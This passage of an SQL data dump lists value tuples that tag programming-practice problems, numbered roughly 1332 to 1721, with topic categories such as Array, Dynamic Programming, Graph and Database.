Pointers',1332),(4008,'String',1332),(4009,'Array',1333),(4010,'Sorting',1333),(4011,'Dynamic Programming',1334),(4012,'Graph',1334),(4013,'Shortest Path',1334),(4014,'Array',1335),(4015,'Dynamic Programming',1335),(4016,'Database',1336),(4017,'Array',1337),(4018,'Binary Search',1337),(4019,'Sorting',1337),(4020,'Heap (Priority Queue)',1337),(4021,'Matrix',1337),(4022,'Array',1338),(4023,'Hash Table',1338),(4024,'Greedy',1338),(4025,'Sorting',1338),(4026,'Heap (Priority Queue)',1338),(4027,'Tree',1339),(4028,'Depth-First Search',1339),(4029,'Binary Tree',1339),(4030,'Array',1340),(4031,'Dynamic Programming',1340),(4032,'Sorting',1340),(4033,'Database',1341),(4034,'Math',1342),(4035,'Bit Manipulation',1342),(4036,'Array',1343),(4037,'Sliding Window',1343),(4038,'Math',1344),(4039,'Array',1345),(4040,'Hash Table',1345),(4041,'Breadth-First Search',1345),(4042,'Array',1346),(4043,'Hash Table',1346),(4044,'Two Pointers',1346),(4045,'Binary Search',1346),(4046,'Sorting',1346),(4047,'Hash Table',1347),(4048,'String',1347),(4049,'Counting',1347),(4050,'Hash Table',1348),(4051,'Binary Search',1348),(4052,'Design',1348),(4053,'Sorting',1348),(4054,'Ordered Set',1348),(4055,'Array',1349),(4056,'Dynamic Programming',1349),(4057,'Bit Manipulation',1349),(4058,'Matrix',1349),(4059,'Bitmask',1349),(4060,'Database',1350),(4061,'Array',1351),(4062,'Binary Search',1351),(4063,'Matrix',1351),(4064,'Array',1352),(4065,'Math',1352),(4066,'Design',1352),(4067,'Queue',1352),(4068,'Data Stream',1352),(4069,'Array',1353),(4070,'Greedy',1353),(4071,'Sorting',1353),(4072,'Heap (Priority Queue)',1353),(4073,'Array',1354),(4074,'Heap (Priority Queue)',1354),(4075,'Database',1355),(4076,'Array',1356),(4077,'Bit Manipulation',1356),(4078,'Sorting',1356),(4079,'Counting',1356),(4080,'Array',1357),(4081,'Hash Table',1357),(4082,'Design',1357),(4083,'Hash Table',1358),(4084,'String',1358),(4085,'Sliding Window',1358),(4086,'Math',1359),(4087,'Dynamic Programming',1359),(4088,'Combinatorics',1359),(4089,'Math',1360),(4090,'String',1360),(4091,'Tree',1361),(4092,'Depth-First Search',1361),(4093,'Breadth-First Search',1361),(4094,'Union Find',1361),(4095,'Graph',1361),(4096,'Binary Tree',1361),(4097,'Math',1362),(4098,'Array',1363),(4099,'Dynamic Programming',1363),(4100,'Greedy',1363),(4101,'Database',1364),(4102,'Array',1365),(4103,'Hash Table',1365),(4104,'Sorting',1365),(4105,'Counting',1365),(4106,'Array',1366),(4107,'Hash Table',1366),(4108,'String',1366),(4109,'Sorting',1366),(4110,'Counting',1366),(4111,'Linked List',1367),(4112,'Tree',1367),(4113,'Depth-First Search',1367),(4114,'Breadth-First Search',1367),(4115,'Binary Tree',1367),(4116,'Array',1368),(4117,'Breadth-First Search',1368),(4118,'Graph',1368),(4119,'Heap (Priority Queue)',1368),(4120,'Matrix',1368),(4121,'Shortest Path',1368),(4122,'Database',1369),(4123,'Hash Table',1370),(4124,'String',1370),(4125,'Counting',1370),(4126,'Hash Table',1371),(4127,'String',1371),(4128,'Bit Manipulation',1371),(4129,'Prefix Sum',1371),(4130,'Dynamic Programming',1372),(4131,'Tree',1372),(4132,'Depth-First Search',1372),(4133,'Binary Tree',1372),(4134,'Dynamic Programming',1373),(4135,'Tree',1373),(4136,'Depth-First Search',1373),(4137,'Binary Search Tree',1373),(4138,'Binary Tree',1373),(4139,'String',1374),(4140,'Array',1375),(4141,'Tree',1376),(4142,'Depth-First Search',1376),(4143,'Breadth-First Search',1376),(4144,'Tree',1377),(4145,'Depth-First Search',1377),(4146,'Breadth-First Search',1377),(4147,'Graph',1377),(4148,'Database',1378),(4149,'Tree',1379),(4150,'Depth-First Search',1379),(4151,'Breadth-First Search',1379),(4152,'Binary Tree',1379),(4153,'Array',1380),(4154,'Matrix',1380),(4155,'Array',1381),(4156,'Stack',1381),(4157,'Design',1381),(4158,'Divide and Conquer',1382),(4159,'Greedy',1382),(4160,'Tree',1382),(4161,'Depth-First Search',1382),(4162,'Binary Search Tree',1382),(4163,'Binary Tree',1382),(4164,'Array',1383),(4165,'Greedy',1383),(4166,'Sorting',1383),(4167,'Heap (Priority Queue)',1383),(4168,'Database',1384),(4169,'Array',1385),(4170,'Two Pointers',1385),(4171,'Binary Search',1385),(4172,'Sorting',1385),(4173,'Array',1386),(4174,'Hash Table',1386),(4175,'Greedy',1386),(4176,'Bit Manipulation',1386),(4177,'Dynamic Programming',1387),(4178,'Memoization',1387),(4179,'Sorting',1387),(4180,'Array',1388),(4181,'Dynamic Programming',1388),(4182,'Greedy',1388),(4183,'Heap (Priority Queue)',1388),(4184,'Array',1389),(4185,'Simulation',1389),(4186,'Array',1390),(4187,'Math',1390),(4188,'Array',1391),(4189,'Depth-First Search',1391),(4190,'Breadth-First Search',1391),(4191,'Union Find',1391),(4192,'Matrix',1391),(4193,'String',1392),(4194,'Rolling Hash',1392),(4195,'String Matching',1392),(4196,'Hash Function',1392),(4197,'Database',1393),(4198,'Array',1394),(4199,'Hash Table',1394),(4200,'Counting',1394),(4201,'Array',1395),(4202,'Dynamic Programming',1395),(4203,'Binary Indexed Tree',1395),(4204,'Hash Table',1396),(4205,'String',1396),(4206,'Design',1396),(4207,'String',1397),(4208,'Dynamic Programming',1397),(4209,'String Matching',1397),(4210,'Database',1398),(4211,'Hash Table',1399),(4212,'Math',1399),(4213,'Hash Table',1400),(4214,'String',1400),(4215,'Greedy',1400),(4216,'Counting',1400),(4217,'Math',1401),(4218,'Geometry',1401),(4219,'Array',1402),(4220,'Dynamic Programming',1402),(4221,'Greedy',1402),(4222,'Sorting',1402),(4223,'Array',1403),(4224,'Greedy',1403),(4225,'Sorting',1403),(4226,'String',1404),(4227,'Bit Manipulation',1404),(4228,'String',1405),(4229,'Greedy',1405),(4230,'Heap (Priority Queue)',1405),(4231,'Array',1406),(4232,'Math',1406),(4233,'Dynamic Programming',1406),(4234,'Game Theory',1406),(4235,'Database',1407),(4236,'Array',1408),(4237,'String',1408),(4238,'String Matching',1408),(4239,'Array',1409),(4240,'Binary Indexed Tree',1409),(4241,'Simulation',1409),(4242,'Hash Table',1410),(4243,'String',1410),(4244,'Dynamic Programming',1411),(4245,'Database',1412),(4246,'Array',1413),(4247,'Prefix Sum',1413),(4248,'Math',1414),(4249,'Greedy',1414),(4250,'String',1415),(4251,'Backtracking',1415),(4252,'String',1416),(4253,'Dynamic Programming',1416),(4254,'String',1417),(4255,'Array',1418),(4256,'Hash Table',1418),(4257,'String',1418),(4258,'Sorting',1418),(4259,'Ordered Set',1418),(4260,'String',1419),(4261,'Counting',1419),(4262,'Dynamic Programming',1420),(4263,'Prefix Sum',1420),(4264,'Database',1421),(4265,'String',1422),(4266,'Array',1423),(4267,'Sliding Window',1423),(4268,'Prefix Sum',1423),(4269,'Array',1424),(4270,'Sorting',1424),(4271,'Heap (Priority Queue)',1424),(4272,'Array',1425),(4273,'Dynamic Programming',1425),(4274,'Queue',1425),(4275,'Sliding Window',1425),(4276,'Heap (Priority Queue)',1425),(4277,'Monotonic Queue',1425),(4278,'Array',1426),(4279,'Hash Table',1426),(4280,'Array',1427),(4281,'Math',1427),(4282,'String',1427),(4283,'Array',1428),(4284,'Binary Search',1428),(4285,'Matrix',1428),(4286,'Interactive',1428),(4287,'Array',1429),(4288,'Hash Table',1429),(4289,'Design',1429),(4290,'Queue',1429),(4291,'Data Stream',1429),(4292,'Tree',1430),(4293,'Depth-First Search',1430),(4294,'Breadth-First Search',1430),(4295,'Binary Tree',1430),(4296,'Array',1431),(4297,'Math',1432),(4298,'Greedy',1432),(4299,'String',1433),(4300,'Greedy',1433),(4301,'Sorting',1433),(4302,'Array',1434),(4303,'Dynamic Programming',1434),(4304,'Bit Manipulation',1434),(4305,'Bitmask',1434),(4306,'Database',1435),(4307,'Array',1436),(4308,'Hash Table',1436),(4309,'String',1436),(4310,'Array',1437),(4311,'Array',1438),(4312,'Queue',1438),(4313,'Sliding Window',1438),(4314,'Heap (Priority Queue)',1438),(4315,'Ordered Set',1438),(4316,'Monotonic Queue',1438),(4317,'Array',1439),(4318,'Binary Search',1439),(4319,'Heap (Priority Queue)',1439),(4320,'Matrix',1439),(4321,'Database',1440),(4322,'Array',1441),(4323,'Stack',1441),(4324,'Simulation',1441),(4325,'Array',1442),(4326,'Hash Table',1442),(4327,'Math',1442),(4328,'Bit Manipulation',1442),(4329,'Prefix Sum',1442),(4330,'Hash Table',1443),(4331,'Tree',1443),(4332,'Depth-First Search',1443),(4333,'Breadth-First Search',1443),(4334,'Array',1444),(4335,'Dynamic Programming',1444),(4336,'Memoization',1444),(4337,'Matrix',1444),(4338,'Database',1445),(4339,'String',1446),(4340,'Math',1447),(4341,'String',1447),(4342,'Number Theory',1447),(4343,'Tree',1448),(4344,'Depth-First Search',1448),(4345,'Breadth-First Search',1448),(4346,'Binary Tree',1448),(4347,'Array',1449),(4348,'Dynamic Programming',1449),(4349,'Array',1450),(4350,'String',1451),(4351,'Sorting',1451),(4352,'Array',1452),(4353,'Hash Table',1452),(4354,'String',1452),(4355,'Array',1453),(4356,'Math',1453),(4357,'Geometry',1453),(4358,'Database',1454),(4359,'String',1455),(4360,'String Matching',1455),(4361,'String',1456),(4362,'Sliding Window',1456),(4363,'Bit Manipulation',1457),(4364,'Tree',1457),(4365,'Depth-First Search',1457),(4366,'Breadth-First Search',1457),(4367,'Binary Tree',1457),(4368,'Array',1458),(4369,'Dynamic Programming',1458),(4370,'Database',1459),(4371,'Array',1460),(4372,'Hash Table',1460),(4373,'Sorting',1460),(4374,'Hash Table',1461),(4375,'String',1461),(4376,'Bit Manipulation',1461),(4377,'Rolling Hash',1461),(4378,'Hash Function',1461),(4379,'Depth-First Search',1462),(4380,'Breadth-First Search',1462),(4381,'Graph',1462),(4382,'Topological Sort',1462),(4383,'Array',1463),(4384,'Dynamic Programming',1463),(4385,'Matrix',1463),(4386,'Array',1464),(4387,'Sorting',1464),(4388,'Heap (Priority Queue)',1464),(4389,'Array',1465),(4390,'Greedy',1465),(4391,'Sorting',1465),(4392,'Depth-First Search',1466),(4393,'Breadth-First Search',1466),(4394,'Graph',1466),(4395,'Array',1467),(4396,'Math',1467),(4397,'Dynamic Programming',1467),(4398,'Backtracking',1467),(4399,'Combinatorics',1467),(4400,'Probability and Statistics',1467),(4401,'Database',1468),(4402,'Tree',1469),(4403,'Depth-First Search',1469),(4404,'Breadth-First Search',1469),(4405,'Binary Tree',1469),(4406,'Array',1470),(4407,'Array',1471),(4408,'Two Pointers',1471),(4409,'Sorting',1471),(4410,'Array',1472),(4411,'Linked List',1472),(4412,'Stack',1472),(4413,'Design',1472),(4414,'Doubly-Linked List',1472),(4415,'Data Stream',1472),(4416,'Array',1473),(4417,'Dynamic Programming',1473),(4418,'Linked List',1474),(4419,'Array',1475),(4420,'Stack',1475),(4421,'Monotonic Stack',1475),(4422,'Array',1476),(4423,'Design',1476),(4424,'Matrix',1476),(4425,'Array',1477),(4426,'Hash Table',1477),(4427,'Binary Search',1477),(4428,'Dynamic Programming',1477),(4429,'Sliding Window',1477),(4430,'Array',1478),(4431,'Math',1478),(4432,'Dynamic Programming',1478),(4433,'Sorting',1478),(4434,'Database',1479),(4435,'Array',1480),(4436,'Prefix Sum',1480),(4437,'Array',1481),(4438,'Hash Table',1481),(4439,'Greedy',1481),(4440,'Sorting',1481),(4441,'Counting',1481),(4442,'Array',1482),(4443,'Binary Search',1482),(4444,'Binary Search',1483),(4445,'Dynamic Programming',1483),(4446,'Tree',1483),(4447,'Depth-First Search',1483),(4448,'Breadth-First Search',1483),(4449,'Design',1483),(4450,'Database',1484),(4451,'Hash Table',1485),(4452,'Tree',1485),(4453,'Depth-First Search',1485),(4454,'Breadth-First Search',1485),(4455,'Binary Tree',1485),(4456,'Math',1486),(4457,'Bit Manipulation',1486),(4458,'Array',1487),(4459,'Hash Table',1487),(4460,'String',1487),(4461,'Array',1488),(4462,'Hash Table',1488),(4463,'Binary Search',1488),(4464,'Greedy',1488),(4465,'Heap (Priority Queue)',1488),(4466,'Union Find',1489),(4467,'Graph',1489),(4468,'Sorting',1489),(4469,'Minimum Spanning Tree',1489),(4470,'Strongly Connected Component',1489),(4471,'Hash Table',1490),(4472,'Tree',1490),(4473,'Depth-First Search',1490),(4474,'Breadth-First Search',1490),(4475,'Array',1491),(4476,'Sorting',1491),(4477,'Math',1492),(4478,'Number Theory',1492),(4479,'Array',1493),(4480,'Dynamic Programming',1493),(4481,'Sliding Window',1493),(4482,'Dynamic Programming',1494),(4483,'Bit Manipulation',1494),(4484,'Graph',1494),(4485,'Bitmask',1494),(4486,'Database',1495),(4487,'Hash Table',1496),(4488,'String',1496),(4489,'Array',1497),(4490,'Hash Table',1497),(4491,'Counting',1497),(4492,'Array',1498),(4493,'Two Pointers',1498),(4494,'Binary Search',1498),(4495,'Sorting',1498),(4496,'Array',1499),(4497,'Queue',1499),(4498,'Sliding Window',1499),(4499,'Heap (Priority Queue)',1499),(4500,'Monotonic Queue',1499),(4501,'Hash Table',1500),(4502,'Design',1500),(4503,'Heap (Priority Queue)',1500),(4504,'Data Stream',1500),(4505,'Database',1501),(4506,'Array',1502),(4507,'Sorting',1502),(4508,'Array',1503),(4509,'Brainteaser',1503),(4510,'Simulation',1503),(4511,'Array',1504),(4512,'Dynamic Programming',1504),(4513,'Stack',1504),(4514,'Matrix',1504),(4515,'Monotonic Stack',1504),(4516,'String',1505),(4517,'Greedy',1505),(4518,'Binary Indexed Tree',1505),(4519,'Segment Tree',1505),(4520,'Hash Table',1506),(4521,'Bit Manipulation',1506),(4522,'Tree',1506),(4523,'Depth-First Search',1506),(4524,'String',1507),(4525,'Array',1508),(4526,'Two Pointers',1508),(4527,'Binary Search',1508),(4528,'Sorting',1508),(4529,'Array',1509),(4530,'Greedy',1509),(4531,'Sorting',1509),(4532,'Math',1510),(4533,'Dynamic Programming',1510),(4534,'Game Theory',1510),(4535,'Database',1511),(4536,'Array',1512),(4537,'Hash Table',1512),(4538,'Math',1512),(4539,'Counting',1512),(4540,'Math',1513),(4541,'String',1513),(4542,'Array',1514),(4543,'Graph',1514),(4544,'Heap (Priority Queue)',1514),(4545,'Shortest Path',1514),(4546,'Math',1515),(4547,'Geometry',1515),(4548,'Randomized',1515),(4549,'Tree',1516),(4550,'Depth-First Search',1516),(4551,'Database',1517),(4552,'Math',1518),(4553,'Simulation',1518),(4554,'Hash Table',1519),(4555,'Tree',1519),(4556,'Depth-First Search',1519),(4557,'Breadth-First Search',1519),(4558,'Counting',1519),(4559,'String',1520),(4560,'Greedy',1520),(4561,'Array',1521),(4562,'Binary Search',1521),(4563,'Bit Manipulation',1521),(4564,'Segment Tree',1521),(4565,'Tree',1522),(4566,'Depth-First Search',1522),(4567,'Math',1523),(4568,'Array',1524),(4569,'Math',1524),(4570,'Dynamic Programming',1524),(4571,'Prefix Sum',1524),(4572,'String',1525),(4573,'Dynamic Programming',1525),(4574,'Bit Manipulation',1525),(4575,'Array',1526),(4576,'Dynamic Programming',1526),(4577,'Stack',1526),(4578,'Greedy',1526),(4579,'Monotonic Stack',1526),(4580,'Database',1527),(4581,'Array',1528),(4582,'String',1528),(4583,'String',1529),(4584,'Greedy',1529),(4585,'Tree',1530),(4586,'Depth-First Search',1530),(4587,'Binary Tree',1530),(4588,'String',1531),(4589,'Dynamic Programming',1531),(4590,'Database',1532),(4591,'Array',1533),(4592,'Binary Search',1533),(4593,'Interactive',1533),(4594,'Array',1534),(4595,'Enumeration',1534),(4596,'Array',1535),(4597,'Simulation',1535),(4598,'Array',1536),(4599,'Greedy',1536),(4600,'Matrix',1536),(4601,'Array',1537),(4602,'Two Pointers',1537),(4603,'Dynamic Programming',1537),(4604,'Greedy',1537),(4605,'Array',1538),(4606,'Math',1538),(4607,'Interactive',1538),(4608,'Array',1539),(4609,'Binary Search',1539),(4610,'Hash Table',1540),(4611,'String',1540),(4612,'String',1541),(4613,'Stack',1541),(4614,'Greedy',1541),(4615,'Hash Table',1542),(4616,'String',1542),(4617,'Bit Manipulation',1542),(4618,'Database',1543),(4619,'String',1544),(4620,'Stack',1544),(4621,'String',1545),(4622,'Recursion',1545),(4623,'Array',1546),(4624,'Hash Table',1546),(4625,'Greedy',1546),(4626,'Prefix Sum',1546),(4627,'Array',1547),(4628,'Dynamic Programming',1547),(4629,'Sorting',1547),(4630,'Dynamic Programming',1548),(4631,'Graph',1548),(4632,'Database',1549),(4633,'Array',1550),(4634,'Math',1551),(4635,'Array',1552),(4636,'Binary Search',1552),(4637,'Sorting',1552),(4638,'Dynamic Programming',1553),(4639,'Memoization',1553),(4640,'Hash Table',1554),(4641,'String',1554),(4642,'Rolling Hash',1554),(4643,'Hash Function',1554),(4644,'Database',1555),(4645,'String',1556),(4646,'Graph',1557),(4647,'Array',1558),(4648,'Greedy',1558),(4649,'Bit Manipulation',1558),(4650,'Array',1559),(4651,'Depth-First Search',1559),(4652,'Breadth-First Search',1559),(4653,'Union Find',1559),(4654,'Matrix',1559),(4655,'Array',1560),(4656,'Simulation',1560),(4657,'Array',1561),(4658,'Math',1561),(4659,'Greedy',1561),(4660,'Sorting',1561),(4661,'Game Theory',1561),(4662,'Array',1562),(4663,'Binary Search',1562),(4664,'Simulation',1562),(4665,'Array',1563),(4666,'Math',1563),(4667,'Dynamic Programming',1563),(4668,'Game Theory',1563),(4669,'Array',1564),(4670,'Greedy',1564),(4671,'Sorting',1564),(4672,'Database',1565),(4673,'Array',1566),(4674,'Enumeration',1566),(4675,'Array',1567),(4676,'Dynamic Programming',1567),(4677,'Greedy',1567),(4678,'Array',1568),(4679,'Depth-First Search',1568),(4680,'Breadth-First Search',1568),(4681,'Matrix',1568),(4682,'Strongly Connected Component',1568),(4683,'Array',1569),(4684,'Math',1569),(4685,'Divide and Conquer',1569),(4686,'Dynamic Programming',1569),(4687,'Tree',1569),(4688,'Union Find',1569),(4689,'Binary Search Tree',1569),(4690,'Memoization',1569),(4691,'Combinatorics',1569),(4692,'Binary Tree',1569),(4693,'Array',1570),(4694,'Hash Table',1570),(4695,'Two Pointers',1570),(4696,'Design',1570),(4697,'Database',1571),(4698,'Array',1572),(4699,'Matrix',1572),(4700,'Math',1573),(4701,'String',1573),(4702,'Array',1574),(4703,'Two Pointers',1574),(4704,'Binary Search',1574),(4705,'Stack',1574),(4706,'Monotonic Stack',1574),(4707,'Array',1575),(4708,'Dynamic Programming',1575),(4709,'Memoization',1575),(4710,'String',1576),(4711,'Array',1577),(4712,'Hash Table',1577),(4713,'Math',1577),(4714,'Two Pointers',1577),(4715,'Array',1578),(4716,'String',1578),(4717,'Dynamic Programming',1578),(4718,'Greedy',1578),(4719,'Union Find',1579),(4720,'Graph',1579),(4721,'Array',1580),(4722,'Greedy',1580),(4723,'Sorting',1580),(4724,'Database',1581),(4725,'Array',1582),(4726,'Matrix',1582),(4727,'Array',1583),(4728,'Simulation',1583),(4729,'Array',1584),(4730,'Union Find',1584),(4731,'Graph',1584),(4732,'Minimum Spanning Tree',1584),(4733,'String',1585),(4734,'Greedy',1585),(4735,'Sorting',1585),(4736,'Stack',1586),(4737,'Tree',1586),(4738,'Design',1586),(4739,'Binary Search Tree',1586),(4740,'Binary Tree',1586),(4741,'Iterator',1586),(4742,'Database',1587),(4743,'Array',1588),(4744,'Math',1588),(4745,'Prefix Sum',1588),(4746,'Array',1589),(4747,'Greedy',1589),(4748,'Sorting',1589),(4749,'Prefix Sum',1589),(4750,'Array',1590),(4751,'Hash Table',1590),(4752,'Prefix Sum',1590),(4753,'Array',1591),(4754,'Graph',1591),(4755,'Topological Sort',1591),(4756,'Matrix',1591),(4757,'String',1592),(4758,'Hash Table',1593),(4759,'String',1593),(4760,'Backtracking',1593),(4761,'Array',1594),(4762,'Dynamic Programming',1594),(4763,'Matrix',1594),(4764,'Array',1595),(4765,'Dynamic Programming',1595),(4766,'Bit Manipulation',1595),(4767,'Matrix',1595),(4768,'Bitmask',1595),(4769,'Database',1596),(4770,'String',1597),(4771,'Stack',1597),(4772,'Tree',1597),(4773,'Binary Tree',1597),(4774,'Array',1598),(4775,'String',1598),(4776,'Stack',1598),(4777,'Array',1599),(4778,'Simulation',1599),(4779,'Hash Table',1600),(4780,'Tree',1600),(4781,'Depth-First Search',1600),(4782,'Design',1600),(4783,'Array',1601),(4784,'Backtracking',1601),(4785,'Bit Manipulation',1601),(4786,'Enumeration',1601),(4787,'Tree',1602),(4788,'Breadth-First Search',1602),(4789,'Binary Tree',1602),(4790,'Design',1603),(4791,'Simulation',1603),(4792,'Counting',1603),(4793,'Array',1604),(4794,'Hash Table',1604),(4795,'String',1604),(4796,'Sorting',1604),(4797,'Array',1605),(4798,'Greedy',1605),(4799,'Matrix',1605),(4800,'Array',1606),(4801,'Greedy',1606),(4802,'Heap (Priority Queue)',1606),(4803,'Ordered Set',1606),(4804,'Database',1607),(4805,'Array',1608),(4806,'Binary Search',1608),(4807,'Sorting',1608),(4808,'Tree',1609),(4809,'Breadth-First Search',1609),(4810,'Binary Tree',1609),(4811,'Array',1610),(4812,'Math',1610),(4813,'Geometry',1610),(4814,'Sliding Window',1610),(4815,'Sorting',1610),(4816,'Dynamic Programming',1611),(4817,'Bit Manipulation',1611),(4818,'Memoization',1611),(4819,'Tree',1612),(4820,'Depth-First Search',1612),(4821,'Binary Tree',1612),(4822,'Database',1613),(4823,'String',1614),(4824,'Stack',1614),(4825,'Graph',1615),(4826,'Two Pointers',1616),(4827,'String',1616),(4828,'Dynamic Programming',1617),(4829,'Bit Manipulation',1617),(4830,'Tree',1617),(4831,'Enumeration',1617),(4832,'Bitmask',1617),(4833,'Array',1618),(4834,'String',1618),(4835,'Binary Search',1618),(4836,'Interactive',1618),(4837,'Array',1619),(4838,'Sorting',1619),(4839,'Array',1620),(4840,'Enumeration',1620),(4841,'Math',1621),(4842,'Dynamic Programming',1621),(4843,'Math',1622),(4844,'Design',1622),(4845,'Segment Tree',1622),(4846,'Database',1623),(4847,'Hash Table',1624),(4848,'String',1624),(4849,'String',1625),(4850,'Breadth-First Search',1625),(4851,'Array',1626),(4852,'Dynamic Programming',1626),(4853,'Sorting',1626),(4854,'Array',1627),(4855,'Math',1627),(4856,'Union Find',1627),(4857,'Number Theory',1627),(4858,'Math',1628),(4859,'Stack',1628),(4860,'Tree',1628),(4861,'Design',1628),(4862,'Binary Tree',1628),(4863,'Array',1629),(4864,'String',1629),(4865,'Array',1630),(4866,'Sorting',1630),(4867,'Array',1631),(4868,'Binary Search',1631),(4869,'Depth-First Search',1631),(4870,'Breadth-First Search',1631),(4871,'Union Find',1631),(4872,'Heap (Priority Queue)',1631),(4873,'Matrix',1631),(4874,'Array',1632),(4875,'Union Find',1632),(4876,'Graph',1632),(4877,'Topological Sort',1632),(4878,'Sorting',1632),(4879,'Matrix',1632),(4880,'Database',1633),(4881,'Linked List',1634),(4882,'Math',1634),(4883,'Two Pointers',1634),(4884,'Database',1635),(4885,'Array',1636),(4886,'Hash Table',1636),(4887,'Sorting',1636),(4888,'Array',1637),(4889,'Sorting',1637),(4890,'Hash Table',1638),(4891,'String',1638),(4892,'Dynamic Programming',1638),(4893,'Array',1639),(4894,'String',1639),(4895,'Dynamic Programming',1639),(4896,'Array',1640),(4897,'Hash Table',1640),(4898,'Math',1641),(4899,'Dynamic Programming',1641),(4900,'Combinatorics',1641),(4901,'Array',1642),(4902,'Greedy',1642),(4903,'Heap (Priority Queue)',1642),(4904,'Array',1643),(4905,'Math',1643),(4906,'Dynamic Programming',1643),(4907,'Combinatorics',1643),(4908,'Tree',1644),(4909,'Depth-First Search',1644),(4910,'Binary Tree',1644),(4911,'Database',1645),(4912,'Array',1646),(4913,'Dynamic Programming',1646),(4914,'Simulation',1646),(4915,'Hash Table',1647),(4916,'String',1647),(4917,'Greedy',1647),(4918,'Sorting',1647),(4919,'Array',1648),(4920,'Math',1648),(4921,'Binary Search',1648),(4922,'Greedy',1648),(4923,'Sorting',1648),(4924,'Heap (Priority Queue)',1648),(4925,'Array',1649),(4926,'Binary Search',1649),(4927,'Divide and Conquer',1649),(4928,'Binary Indexed Tree',1649),(4929,'Segment Tree',1649),(4930,'Merge Sort',1649),(4931,'Ordered Set',1649),(4932,'Hash Table',1650),(4933,'Two Pointers',1650),(4934,'Tree',1650),(4935,'Binary Tree',1650),(4936,'Database',1651),(4937,'Array',1652),(4938,'String',1653),(4939,'Dynamic Programming',1653),(4940,'Stack',1653),(4941,'Array',1654),(4942,'Dynamic Programming',1654),(4943,'Breadth-First Search',1654),(4944,'Array',1655),(4945,'Dynamic Programming',1655),(4946,'Backtracking',1655),(4947,'Bit Manipulation',1655),(4948,'Bitmask',1655),(4949,'Array',1656),(4950,'Hash Table',1656),(4951,'Design',1656),(4952,'Data Stream',1656),(4953,'Hash Table',1657),(4954,'String',1657),(4955,'Sorting',1657),(4956,'Array',1658),(4957,'Hash Table',1658),(4958,'Binary Search',1658),(4959,'Sliding Window',1658),(4960,'Prefix Sum',1658),(4961,'Dynamic Programming',1659),(4962,'Bit Manipulation',1659),(4963,'Memoization',1659),(4964,'Bitmask',1659),(4965,'Hash Table',1660),(4966,'Tree',1660),(4967,'Depth-First Search',1660),(4968,'Breadth-First Search',1660),(4969,'Binary Tree',1660),(4970,'Database',1661),(4971,'Array',1662),(4972,'String',1662),(4973,'String',1663),(4974,'Greedy',1663),(4975,'Array',1664),(4976,'Dynamic Programming',1664),(4977,'Array',1665),(4978,'Greedy',1665),(4979,'Sorting',1665),(4980,'Tree',1666),(4981,'Depth-First Search',1666),(4982,'Binary Tree',1666),(4983,'Database',1667),(4984,'String',1668),(4985,'String Matching',1668),(4986,'Linked List',1669),(4987,'Array',1670),(4988,'Linked List',1670),(4989,'Design',1670),(4990,'Queue',1670),(4991,'Data Stream',1670),(4992,'Array',1671),(4993,'Binary Search',1671),(4994,'Dynamic Programming',1671),(4995,'Greedy',1671),(4996,'Array',1672),(4997,'Matrix',1672),(4998,'Array',1673),(4999,'Stack',1673),(5000,'Greedy',1673),(5001,'Monotonic Stack',1673),(5002,'Array',1674),(5003,'Hash Table',1674),(5004,'Prefix Sum',1674),(5005,'Array',1675),(5006,'Greedy',1675),(5007,'Heap (Priority Queue)',1675),(5008,'Ordered Set',1675),(5009,'Hash Table',1676),(5010,'Tree',1676),(5011,'Depth-First Search',1676),(5012,'Binary Tree',1676),(5013,'Database',1677),(5014,'String',1678),(5015,'Array',1679),(5016,'Hash Table',1679),(5017,'Two Pointers',1679),(5018,'Sorting',1679),(5019,'Math',1680),(5020,'Bit Manipulation',1680),(5021,'Simulation',1680),(5022,'Array',1681),(5023,'Dynamic Programming',1681),(5024,'Bit Manipulation',1681),(5025,'Bitmask',1681),(5026,'String',1682),(5027,'Dynamic Programming',1682),(5028,'Database',1683),(5029,'Array',1684),(5030,'Hash Table',1684),(5031,'String',1684),(5032,'Bit Manipulation',1684),(5033,'Array',1685),(5034,'Math',1685),(5035,'Prefix Sum',1685),(5036,'Array',1686),(5037,'Math',1686),(5038,'Greedy',1686),(5039,'Sorting',1686),(5040,'Heap (Priority Queue)',1686),(5041,'Game Theory',1686),(5042,'Array',1687),(5043,'Dynamic Programming',1687),(5044,'Segment Tree',1687),(5045,'Queue',1687),(5046,'Heap (Priority Queue)',1687),(5047,'Prefix Sum',1687),(5048,'Monotonic Queue',1687),(5049,'Math',1688),(5050,'Simulation',1688),(5051,'String',1689),(5052,'Greedy',1689),(5053,'Array',1690),(5054,'Math',1690),(5055,'Dynamic Programming',1690),(5056,'Game Theory',1690),(5057,'Array',1691),(5058,'Dynamic Programming',1691),(5059,'Sorting',1691),(5060,'Dynamic Programming',1692),(5061,'Database',1693),(5062,'String',1694),(5063,'Array',1695),(5064,'Hash Table',1695),(5065,'Sliding Window',1695),(5066,'Array',1696),(5067,'Dynamic Programming',1696),(5068,'Queue',1696),(5069,'Heap (Priority Queue)',1696),(5070,'Monotonic Queue',1696),(5071,'Array',1697),(5072,'Two Pointers',1697),(5073,'Union Find',1697),(5074,'Graph',1697),(5075,'Sorting',1697),(5076,'String',1698),(5077,'Trie',1698),(5078,'Rolling Hash',1698),(5079,'Suffix Array',1698),(5080,'Hash Function',1698),(5081,'Database',1699),(5082,'Array',1700),(5083,'Stack',1700),(5084,'Queue',1700),(5085,'Simulation',1700),(5086,'Array',1701),(5087,'Simulation',1701),(5088,'String',1702),(5089,'Greedy',1702),(5090,'Array',1703),(5091,'Greedy',1703),(5092,'Sliding Window',1703),(5093,'Prefix Sum',1703),(5094,'String',1704),(5095,'Counting',1704),(5096,'Array',1705),(5097,'Greedy',1705),(5098,'Heap (Priority Queue)',1705),(5099,'Array',1706),(5100,'Dynamic Programming',1706),(5101,'Depth-First Search',1706),(5102,'Matrix',1706),(5103,'Simulation',1706),(5104,'Array',1707),(5105,'Bit Manipulation',1707),(5106,'Trie',1707),(5107,'Array',1708),(5108,'Greedy',1708),(5109,'Database',1709),(5110,'Array',1710),(5111,'Greedy',1710),(5112,'Sorting',1710),(5113,'Array',1711),(5114,'Hash Table',1711),(5115,'Array',1712),(5116,'Two Pointers',1712),(5117,'Binary Search',1712),(5118,'Prefix Sum',1712),(5119,'Array',1713),(5120,'Hash Table',1713),(5121,'Binary Search',1713),(5122,'Greedy',1713),(5123,'Array',1714),(5124,'Dynamic Programming',1714),(5125,'Database',1715),(5126,'Math',1716),(5127,'String',1717),(5128,'Stack',1717),(5129,'Greedy',1717),(5130,'Array',1718),(5131,'Backtracking',1718),(5132,'Tree',1719),(5133,'Graph',1719),(5134,'Array',1720),(5135,'Bit Manipulation',1720),(5136,'Linked List',1721),(5137,'Two 